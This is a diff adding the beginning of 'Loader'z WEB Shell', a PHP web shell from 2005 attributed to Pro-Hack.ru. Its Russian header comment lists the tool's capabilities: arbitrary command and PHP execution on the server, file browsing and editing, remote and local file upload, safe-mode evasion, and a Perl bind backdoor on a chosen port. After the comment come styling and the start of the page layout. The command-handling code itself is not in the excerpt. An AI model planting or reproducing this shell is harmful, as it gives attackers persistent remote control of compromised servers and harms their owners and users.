@@ -1,0 +1,76 @@
+?><?
+error_reporting(0);
+/* Loader'z WEB Shell v 0.1.0.2 {15 августа 2005}
+Вот какие он поддерживает функции.
+- Работа с файловой системой с помощью PHP. В удобной таблице представлено содержимое текущей паки (добавление в этой версии, нормальный вид прав, а не число :)).
+- Выполнение кода, пхп рулит ;)
+- Работает при register_globals=off
+- Более приятная работа в сейф моде
+- Просмотр и редактирование файлов.
+- Закачка файлов с другого сервера с помощью средств PHP.
+- Закачка файлов с вашего жесткого диска.
+- Выполнение произвольных команд на сервере.
+- Скрипт выдает значение некоторых переменных. Например он сообщит включен ли сейф мод, если да, то скрипт выведет директорию которая,
+вам доступна, а так же путь, где вы можете выполнять команды.
+- Работа скрипта основана на определении типа сервера.
+- Если скрипт работает под управлением ОС Windows, данные получаемые при выполнении команд перекодируются в win-1251.
+- Присутствует простенький скрипт перл-бинд. Вы можете указать домашнюю директрию и порт на котором повесится бекдор.
+Loader Pro-Hack.ru
+*/
+?>
+
+<style type='text/css'>
+html { overflow-x: auto }
+BODY { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; margin: 0px; padding: 0px; text-align: center; color: #c0c0c0; background-color: #000000 }
+TABLE, TR, TD { font-family: Verdana, Tahoma, Arial, sans-serif; font-size: 11px; color: #c0c0c0; background-color: #0000000 }
+BODY,TD {FONT-SIZE: 13px; FONT-FAMILY: verdana, arial, helvetica;}
+A:link {COLOR: #666666; TEXT-DECORATION: none}
+A:active {	COLOR: #666666; TEXT-DECORATION: none;}
+A:visited {COLOR: #666666; TEXT-DECORATION: none;}
+A:hover {COLOR: #999999; TEXT-DECORATION: none;}
+BODY {
+	SCROLLBAR-FACE-COLOR: #cccccc;
+	SCROLLBAR-HIGHLIGHT-COLOR: #CBAB78;
+	SCROLLBAR-SHADOW-COLOR: #CBAB78;
+	SCROLLBAR-3DLIGHT-COLOR: #CBAB78;
+	SCROLLBAR-ARROW-COLOR: #000000;
+	SCROLLBAR-TRACK-COLOR: #000000;
+	SCROLLBAR-DARKSHADOW-COLOR: #CBAB78}
+
+
+
+
+fieldset.search { padding: 6px; line-height: 150% }
+
+label { cursor: pointer }
+
+form { display: inline }
+
+img { vertical-align: middle; border: 0px }
+
+img.attach { padding: 2px; border: 2px outset #000033 }
+
+#tb { padding: 0px; margin: 0px; background-color: #000000; border: 1px solid #CBAB78; }
+#logostrip { padding: 0px; margin: 0px; background-color: #000000; border: 1px solid #CBAB78; }
+#content { padding: 10px; margin: 10px; background-color: #000000; border: 1px solid #CBAB78; }
+#logo { FONT-SIZE: 50px; }
+input { width: 80; height : 17; background-color : #cccccc;
+ 	border-style: solid;border-width: 1; border-color: #CBAB78; font-size: xx-small; cursor: pointer; }
+#input2 { width: 150; height : 17; background-color : #cccccc;
+ 	border-style: solid;border-width: 1; border-color: #CBAB78; font-size: xx-small; cursor: pointer; }
+
+
+</style>
+
+<script>
+function tag(thetag) {document.fe.editfile.value=thetag;}
+</script>
+
+
+<title>Loader'z WEB shell</title>
+
+<table height=100% "width="100%">
+<tr><td align="center" valign="top">
+
+
+<table><tr><td>
